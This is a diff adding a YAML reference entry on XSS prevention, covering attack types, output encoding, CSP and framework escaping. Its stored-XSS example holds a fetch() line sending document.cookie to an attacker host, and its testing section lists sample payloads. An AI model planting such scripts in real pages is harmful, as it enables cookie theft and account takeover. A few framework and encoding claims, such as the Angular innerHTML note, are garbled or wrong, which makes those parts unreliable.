@@ -1,0 +1,288 @@
+id: xss-prevention
+name: "XSS Prevention (Cross-Site Scripting)"
+category: security
+type: standard
+tags:
+  - security
+  - xss
+  - web-applications
+  - owasp-top-10
+
+summary:
+  short: "Preventing Cross-Site Scripting attacks where attackers inject malicious scripts into web pages"
+  long: |
+    Cross-Site Scripting (XSS) allows attackers to inject JavaScript into web pages viewed by other users. Malicious scripts can steal cookies, perform actions on behalf of users, or redirect to phishing sites. Prevention requires output encoding, input sanitization, and Content Security Policy.
+
+problem:
+  description: "User input displayed on page without encoding allows injecting arbitrary JavaScript"
+  symptoms:
+    - "User enters name with HTML/JavaScript; code executes on page"
+    - "Attacker creates link with payload; victims click and compromise their account"
+    - "Comments section executes attacker's JavaScript for all readers"
+    - "Malicious scripts steal session cookies and user data"
+  impact: "Account takeover, credential theft, malware distribution, defacement"
+
+solution:
+  description: "Encode output based on context (HTML, JavaScript, URL, CSS)"
+  key_principle: "Never trust user input; always encode for the context where it appears"
+
+attack_types:
+  stored_xss:
+    description: "Malicious script stored in database; executes for all users viewing that content"
+    example: |
+      # Attacker posts comment:
+      <script>
+        fetch('https://attacker.com/steal?cookies=' + document.cookie)
+      </script>
+
+      # Site displays comment without encoding:
+      <div class="comment">
+        <script>...</script>  <!-- Script executes! -->
+      </div>
+
+      # Every user viewing this comment gets their cookies stolen
+
+    severity: "High - affects many users, persistent"
+
+  reflected_xss:
+    description: "Malicious script in URL; executes when user visits crafted link"
+    example: |
+      # Attacker sends link:
+      https://victim-site.com/search?q=<script>alert('hacked')</script>
+
+      # Site reflects search parameter without encoding:
+      <h1>Search results for: <script>alert('hacked')</script></h1>
+
+      # User clicks link; script executes in their browser
+
+    severity: "Medium - requires user to click link; single user affected"
+
+  dom_xss:
+    description: "JavaScript code itself (not HTML) is vulnerable"
+    example: |
+      // VULNERABLE
+      document.getElementById('user-input').innerHTML = userInput;
+
+      // If userInput = '<img src=x onerror="alert(\'hacked\')">'
+      // Script executes when image fails to load
+
+    severity: "Medium - depends on where user input comes from"
+
+prevention_techniques:
+  html_encoding:
+    description: "Encode HTML special characters when displaying user content"
+    characters: |
+      & → &amp;
+      < → &lt;
+      > → &gt;
+      " → &quot;
+      ' → &#x27;
+
+    example: |
+      # VULNERABLE
+      name = '<script>alert("xss")</script>'
+      html = f"<div>Hello {name}</div>"
+      # Renders: <div>Hello <script>alert("xss")</script></div>
+
+      # SAFE - HTML encode
+      name = '<script>alert("xss")</script>'
+      html = f"<div>Hello {html_encode(name)}</div>"
+      # Renders: <div>Hello &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</div>
+
+    when_to_use: "Displaying user content in HTML"
+
+  javascript_encoding:
+    description: "Encode when outputting data in JavaScript context"
+    example: |
+      # VULNERABLE
+      user_name = "alice'; alert('xss'); //"
+      html = f"<script> var user = '{user_name}'; </script>"
+      # JavaScript executed: var user = 'alice'; alert('xss'); //'
+
+      # SAFE - JavaScript encode
+      html = f"<script> var user = '{js_encode(user_name)}'; </script>"
+      # JavaScript safe: var user = 'alice\x27; alert(\x27xss\x27); //'
+
+    when_to_use: "Outputting data inside <script> tags"
+
+  url_encoding:
+    description: "Encode when outputting data in URL attributes"
+    example: |
+      # VULNERABLE
+      redirect = 'javascript:alert("xss")'
+      html = f'<a href="{redirect}">Click me</a>'
+      # Clicking link executes JavaScript
+
+      # SAFE - URL encode
+      html = f'<a href="{url_encode(redirect)}">Click me</a>'
+      # href becomes: javascript%3Aalert%28%22xss%22%29 (safe)
+
+    when_to_use: "href, src, form action attributes"
+
+  css_encoding:
+    description: "Encode when outputting data in CSS context"
+    example: |
+      # VULNERABLE
+      color = '"; alert("xss"); //'
+      html = f'<div style="color: {color}"></div>'
+
+      # SAFE - CSS encode
+      html = f'<div style="color: {css_encode(color)}"></div>'
+
+    when_to_use: "style attributes, CSS content"
+
+content_security_policy:
+  description: "HTTP header that restricts where scripts can come from"
+  benefits: |
+    - Inline scripts blocked by default
+    - Only scripts from allowed origins execute
+    - Reduces XSS impact even if encoding fails
+
+  example: |
+    # Only allow scripts from same origin
+    Content-Security-Policy: script-src 'self'
+
+    # Allow scripts from trusted CDN
+    Content-Security-Policy: script-src 'self' https://cdn.example.com
+
+    # Block inline scripts entirely
+    Content-Security-Policy: script-src 'self'; style-src 'self'
+
+  effectiveness: |
+    - Stops most inline script attacks
+    - Doesn't protect against DOM XSS in some cases
+    - Should be used WITH encoding, not instead of it
+
+frameworks_built_in_protection:
+  react: |
+    # React auto-escapes content (prevents most XSS)
+    const name = '<script>alert("xss")</script>';
+    // Safe: renders as text, not script
+    return <div>Hello {name}</div>;
+
+    # Dangerous if you use dangerouslySetInnerHTML
+    return <div dangerouslySetInnerHTML={{__html: name}} />;  // UNSAFE
+
+  django: |
+    # Django auto-escapes by default
+    {{ name }}  {# Safe: auto-escaped #}
+
+    # Unsafe if you use |safe filter
+    {{ name|safe }}  {# UNSAFE - bypasses escaping #}
+
+  angular: |
+    # Angular auto-escapes by default
+    <div>{{ name }}</div>  {# Safe: auto-escaped #}
+
+    # Unsafe with bypassSecurityTrustHtml
+    <div [innerHTML]="name"></div>  {# UNSAFE - doesn't escape #}
+
+input_validation:
+  importance: |
+    Input validation is helpful but NOT sufficient
+    - Validation prevents obvious attacks
+    - Sophisticated attacks may bypass validation
+    - Always encode, even with validation
+
+  example: |
+    # BAD: Only validation
+    if not name.contains('<'):
+      display(name)
+    # Attacker uses: <img src=x onerror="alert('xss')">
+
+    # GOOD: Validation + encoding
+    if not name.matches(r'^[a-zA-Z0-9 ]+$'):
+      raise ValueError("Invalid name")
+    display(html_encode(name))
+
+common_mistakes:
+  - name: "Only encoding in one place"
+    problem: "Encoding in view but not in API; different output contexts"
+    fix: "Encode at point of output for each context"
+
+  - name: "Trusting CSP to prevent all XSS"
+    problem: "CSP is additional layer, not complete solution"
+    fix: "Use CSP + encoding + input validation (defense in depth)"
+
+  - name: "Using wrong encoding"
+    problem: "HTML encode in JavaScript context; still vulnerable"
+    fix: "Use correct encoding for context (HTML/JS/URL/CSS)"
+
+  - name: "Encoding on input instead of output"
+    problem: "Encoded data stored in database; re-encoding on output is wrong"
+    fix: "Store raw data; encode on output"
+
+  - name: "Forgetting DOM XSS"
+    problem: "Focus on HTML encoding; JavaScript code is vulnerable"
+    fix: "Review JavaScript that processes user input"
+
+  - name: "Using old frameworks"
+    problem: "Older versions auto-escape; new framework doesn't"
+    fix: "Use modern framework; verify escaping behavior"
+
+testing_for_xss:
+  manual: |
+    - Try: <script>alert('xss')</script>
+    - Try: <img src=x onerror="alert('xss')">
+    - Try: <svg onload="alert('xss')">
+    - Try: javascript:alert('xss')
+    - Try: <iframe src="javascript:alert('xss')">
+
+  automated: |
+    - OWASP ZAP: Web application scanner
+    - Burp Suite: Manual and automated testing
+    - SonarQube: Static code analysis
+    - npm packages: xss, sanitize-html
+
+best_practices:
+  - name: "Encode all user-controlled output"
+    description: "Non-negotiable; always encode for context"
+
+  - name: "Use framework defaults"
+    description: "Most frameworks auto-escape; don't bypass without reason"
+
+  - name: "Validate input (but don't rely on it)"
+    description: "Additional layer of defense"
+
+  - name: "Implement Content Security Policy"
+    description: "Restrictive CSP mitigates XSS impact"
+
+  - name: "Use security-focused libraries"
+    description: "DOMPurify for sanitizing HTML, etc."
+
+  - name: "Test for XSS regularly"
+    description: "Include in security testing and code review"
+
+  - name: "Review JavaScript code"
+    description: "JavaScript DOM manipulation is XSS risk"
+
+  - name: "Keep dependencies updated"
+    description: "Frameworks patch XSS vulnerabilities"
+
+blog_hooks:
+  beginner:
+    analogy: |
+      XSS is like quoting someone in a newspaper:
+      - BAD: Print exactly what they said, even if it says "PRINT FAKE NEWS"
+        Readers might be confused/harmed
+
+      - GOOD: Print their quote clearly marked
+        Readers know it's a quote, not newspaper's words
+
+      Encoding is like marking content as "user said this," not "this is fact."
+
+  intermediate:
+    focus: "XSS prevention techniques"
+    key_points:
+      - "Stored vs reflected vs DOM XSS"
+      - "Context-specific encoding (HTML/JS/URL/CSS)"
+      - "Content Security Policy"
+      - "When to escape vs when encoding fails"
+
+  advanced:
+    focus: "Complex XSS scenarios"
+    key_points:
+      - "Mutation-based XSS (encoding bypasses)"
+      - "XSS in framework features"
+      - "DOM XSS in single-page applications"
+      - "Finding XSS in legacy code"
